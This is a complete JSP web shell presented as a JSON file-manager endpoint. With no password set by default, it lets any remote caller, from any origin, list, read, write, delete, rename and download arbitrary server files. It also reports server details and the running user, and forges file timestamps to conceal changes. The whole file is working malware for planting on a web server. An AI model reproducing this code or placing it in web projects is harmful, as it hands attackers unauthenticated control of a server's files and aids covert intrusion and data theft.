<%@ page language="java" contentType="application/json; charset=UTF-8" pageEncoding="UTF-8" %>
<%@ page import="java.io.*" %>
<%@ page import="java.util.*" %>
<%
response.setHeader("Access-Control-Allow-Origin", "*");
response.setHeader("Access-Control-Allow-Methods", "GET, POST, OPTIONS");
response.setHeader("Access-Control-Allow-Headers", "Content-Type");

if ("OPTIONS".equalsIgnoreCase(request.getMethod())) {
    response.setStatus(200);
    return;
}

String action = request.getParameter("action");
String pw = request.getParameter("password");

if (action == null || action.equals("")) {
    response.setContentType("text/html");
    return;
}

// Password (change here)
String PASSWORD = "";

if (PASSWORD != null && !PASSWORD.equals("")) {
    if (pw == null || !pw.equals(PASSWORD)) {
        out.print("null");
        return;
    }
}

try {
    if (action.equals("list")) {
        String path = request.getParameter("path");
        if (path == null || path.equals("") || path.equals("/")) {
            path = application.getRealPath("/");
        }
        File dir = new File(path);
        if (dir.exists() && dir.isDirectory()) {
            StringBuilder json = new StringBuilder();
            json.append("{\"success\":true,\"data\":{\"path\":\"");
            json.append(escJson(path));
            json.append("\",\"items\":[");

            String parentPath = dir.getParent();
            if (parentPath != null) {
                json.append("{\"name\":\"..\",\"path\":\"").append(escJson(parentPath));
                json.append("\",\"is_dir\":true,\"size\":0,\"size_formatted\":\"-\",\"mtime\":0,\"perms\":\"drwxr-xr-x\",\"readable\":true,\"writable\":true}");
            }

            File[] files = dir.listFiles();
            if (files != null) {
                Arrays.sort(files);
                for (int i = 0; i < files.length; i++) {
                    File f = files[i];
                    if (json.charAt(json.length() - 1) != '[') json.append(",");
                    long mtime = f.lastModified() / 1000;
                    json.append("{\"name\":\"").append(escJson(f.getName()));
                    json.append("\",\"path\":\"").append(escJson(f.getAbsolutePath()));
                    json.append("\",\"is_dir\":").append(f.isDirectory());
                    json.append(",\"size\":").append(f.isDirectory() ? 0 : f.length());
                    json.append(",\"size_formatted\":\"").append(f.isDirectory() ? "-" : f.length() + " B");
                    json.append("\",\"mtime\":").append(mtime);
                    json.append(",\"perms\":\"").append(f.isDirectory() ? "drwxr-xr-x" : "-rw-r--r--");
                    json.append("\",\"readable\":").append(f.canRead());
                    json.append(",\"writable\":").append(f.canWrite()).append("}");
                }
            }
            json.append("]},\"message\":\"\"}");
            out.print(json.toString());
        } else {
            out.print("{\"success\":false,\"message\":\"Directory not found\"}");
        }

    } else if (action.equals("read")) {
        String path = request.getParameter("path");
        File file = new File(path);
        if (file.exists() && file.isFile()) {
            StringBuilder content = new StringBuilder();
            BufferedReader reader = new BufferedReader(new InputStreamReader(new FileInputStream(file), "UTF-8"));
            String line;
            while ((line = reader.readLine()) != null) {
                if (content.length() > 0) content.append("\n");
                content.append(line);
            }
            reader.close();
            out.print("{\"success\":true,\"data\":{\"path\":\"" + escJson(path) + "\",\"content\":\"" + escJson(content.toString()) + "\"},\"message\":\"\"}");
        } else {
            out.print("{\"success\":false,\"message\":\"File not found\"}");
        }

    } else if (action.equals("write")) {
        String path = request.getParameter("path");
        String content = request.getParameter("content");
        if (content == null) content = "";
        if (path != null && !path.equals("")) {
            PrintWriter writer = new PrintWriter(new OutputStreamWriter(new FileOutputStream(path), "UTF-8"));
            writer.print(content);
            writer.close();
            out.print("{\"success\":true,\"message\":\"Saved\"}");
        } else {
            out.print("{\"success\":false,\"message\":\"Path empty\"}");
        }

    } else if (action.equals("mkdir")) {
        String path = request.getParameter("path");
        if (path != null && !path.equals("")) {
            File dir = new File(path);
            if (!dir.exists()) {
                if (dir.mkdirs()) {
                    out.print("{\"success\":true,\"message\":\"Created\"}");
                } else {
                    out.print("{\"success\":false,\"message\":\"Failed\"}");
                }
            } else {
                out.print("{\"success\":false,\"message\":\"Already exists\"}");
            }
        } else {
            out.print("{\"success\":false,\"message\":\"Path empty\"}");
        }

    } else if (action.equals("delete")) {
        String path = request.getParameter("path");
        File file = new File(path);
        if (file.exists()) {
            if (deleteDir(file)) {
                out.print("{\"success\":true,\"message\":\"Deleted\"}");
            } else {
                out.print("{\"success\":false,\"message\":\"Failed\"}");
            }
        } else {
            out.print("{\"success\":false,\"message\":\"Not found\"}");
        }

    } else if (action.equals("rename")) {
        String oldPath = request.getParameter("old_path");
        String newPath = request.getParameter("new_path");
        File oldFile = new File(oldPath);
        if (oldFile.exists()) {
            if (oldFile.renameTo(new File(newPath))) {
                out.print("{\"success\":true,\"message\":\"Renamed\"}");
            } else {
                out.print("{\"success\":false,\"message\":\"Failed\"}");
            }
        } else {
            out.print("{\"success\":false,\"message\":\"Not found\"}");
        }

    } else if (action.equals("download")) {
        String path = request.getParameter("path");
        File file = new File(path);
        if (file.exists() && file.isFile()) {
            response.setContentType("application/octet-stream");
            response.setHeader("Content-Disposition", "attachment; filename=\"" + file.getName() + "\"");
            response.setContentLength((int) file.length());
            FileInputStream fis = new FileInputStream(file);
            OutputStream os = response.getOutputStream();
            byte[] buffer = new byte[4096];
            int len;
            while ((len = fis.read(buffer)) != -1) {
                os.write(buffer, 0, len);
            }
            fis.close();
            os.flush();
            return;
        } else {
            out.print("{\"success\":false,\"message\":\"Not found\"}");
        }

    } else if (action.equals("server")) {
        String docRoot = application.getRealPath("/");
        File root = new File(docRoot);
        out.print("{\"success\":true,\"data\":{\"php_version\":\"Java " + escJson(System.getProperty("java.version")) + "\",\"server_software\":\"" + escJson(application.getServerInfo()) + "\",\"document_root\":\"" + escJson(docRoot) + "\",\"disk_free\":\"" + root.getFreeSpace() + "\",\"disk_total\":\"" + root.getTotalSpace() + "\",\"current_user\":\"" + System.getProperty("user.name") + "\"},\"message\":\"\"}");

    } else if (action.equals("touch")) {
        String path = request.getParameter("path");
        String timeStr = request.getParameter("time");
        if (path != null && timeStr != null) {
            File file = new File(path);
            if (file.exists()) {
                long ts = Long.parseLong(timeStr) * 1000;
                if (file.setLastModified(ts)) {
                    out.print("{\"success\":true,\"message\":\"Updated\"}");
                } else {
                    out.print("{\"success\":false,\"message\":\"Failed\"}");
                }
            } else {
                out.print("{\"success\":false,\"message\":\"Not found\"}");
            }
        } else {
            out.print("{\"success\":false,\"message\":\"Missing params\"}");
        }

    } else if (action.equals("info")) {
        String path = request.getParameter("path");
        File file = new File(path);
        if (file.exists()) {
            long mtime = file.lastModified() / 1000;
            long size = file.isFile() ? file.length() : 0;
            out.print("{\"success\":true,\"data\":{\"path\":\"" + escJson(path) + "\",\"name\":\"" + escJson(file.getName()) + "\",\"is_dir\":" + file.isDirectory() + ",\"size\":" + size + ",\"mtime\":" + mtime + ",\"ctime\":" + mtime + ",\"atime\":" + mtime + "},\"message\":\"\"}");
        } else {
            out.print("{\"success\":false,\"message\":\"Not found\"}");
        }

    } else {
        out.print("{\"success\":false,\"message\":\"Unknown action\"}");
    }
} catch (Exception e) {
    out.print("{\"success\":false,\"message\":\"Error: " + escJson(e.getMessage()) + "\"}");
}
%>
<%!
private String escJson(String s) {
    if (s == null) return "";
    return s.replace("\\", "\\\\").replace("\"", "\\\"").replace("\n", "\\n").replace("\r", "\\r").replace("\t", "\\t");
}

private boolean deleteDir(File file) {
    if (file.isDirectory()) {
        File[] children = file.listFiles();
        if (children != null) {
            for (int i = 0; i < children.length; i++) {
                deleteDir(children[i]);
            }
        }
    }
    return file.delete();
}
%>
